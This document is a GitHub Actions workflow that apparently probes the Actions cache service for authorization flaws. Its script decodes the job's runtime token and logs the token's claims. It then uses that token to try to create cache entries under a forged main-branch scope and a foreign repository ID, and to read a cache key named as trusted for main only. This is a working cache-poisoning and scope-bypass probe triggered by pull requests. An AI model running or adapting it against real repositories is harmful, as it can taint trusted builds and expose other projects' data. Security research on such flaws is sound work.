name: scope-probe
on:
  push:
  pull_request:
  workflow_dispatch:
permissions: {}
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const results = process.env.ACTIONS_RESULTS_URL || '';
            core.info(`event=${context.eventName} ref=${context.ref}`);
            core.info(`ACTIONS_RESULTS_URL=${results}`);
            core.info(`ACTIONS_CACHE_SERVICE_V2=${process.env.ACTIONS_CACHE_SERVICE_V2}`);
            if (!t) { core.info('NO ACTIONS_RUNTIME_TOKEN'); return; }
            const claims = JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString());
            core.info('--- runtime token claims ---');
            for (const [k,v] of Object.entries(claims).sort()) {
              core.info(`  ${k} = ${typeof v === 'string' ? v.slice(0,500) : JSON.stringify(v).slice(0,500)}`);
            }
            const call = async (method, body, label) => {
              const url = `${results}twirp/github.actions.results.api.v1.CacheService/${method}`;
              try {
                const r = await fetch(url, { method:'POST',
                  headers:{ 'Authorization':`Bearer ${t}`, 'Content-Type':'application/json' },
                  body: JSON.stringify(body) });
                const txt = await r.text();
                core.info(`[${label}] HTTP ${r.status} ${txt.slice(0,300)}`);
              } catch (e) { core.info(`[${label}] threw ${e.message}`); }
            };
            const KEY = `probe-${context.eventName}-${Date.now()}`;
            core.info('--- twirp probes ---');
            await call('CreateCacheEntry', { key: KEY, version: 'v1' }, 'baseline no-metadata');
            await call('CreateCacheEntry', { key: KEY+'-mainscope', version: 'v1',
              metadata: { repository_id: String(context.payload.repository.id),
                          scope: [{ scope: 'refs/heads/main', permission: '3' }] } }, 'metadata scope=refs/heads/main perm=3');
            await call('CreateCacheEntry', { key: KEY+'-otherrepo', version: 'v1',
              metadata: { repository_id: '1', scope: [{ scope: 'refs/heads/main', permission: '3' }] } }, 'metadata repository_id=1');
            await call('GetCacheEntryDownloadURL', { key: 'TRUSTED-MAIN-ONLY', restore_keys: [], version: 'v1' }, 'read TRUSTED-MAIN-ONLY (no metadata)');
            await call('GetCacheEntryDownloadURL', { key: 'TRUSTED-MAIN-ONLY', restore_keys: [], version: 'v1',
              metadata: { repository_id: String(context.payload.repository.id),
                          scope: [{ scope: 'refs/heads/main', permission: '1' }] } }, 'read TRUSTED-MAIN-ONLY w/ main scope');
